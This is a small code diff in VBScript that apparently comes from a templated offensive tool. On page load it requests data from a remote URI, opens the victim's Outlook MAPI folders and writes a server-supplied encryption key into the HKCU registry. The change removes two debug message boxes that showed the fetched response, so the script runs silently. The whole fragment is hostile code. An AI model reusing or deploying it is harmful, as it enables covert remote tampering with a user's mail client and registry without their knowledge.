@@ -85,8 +85,6 @@ Sub window_onload()
 	rul = requestpage(uriloc, chr(34) & O & chr(34))
 	
 	if not rul = "" Then
-		msgbox(rul)
-		msgbox(Split(rul,"||")(1))
 		Set box = outlookapp.GetNameSpace("MAPI")
 		Set fold = box.GetDefaultFolder(9)
 		val1 = SetRegKey("HKCU\" & {{ ENCRYPTIONKEY_LOCATION }} & "\" & {{ ENCRYPTIONKEY_VALUENAME }}, Split(rul,"||")(0), "REG_SZ")
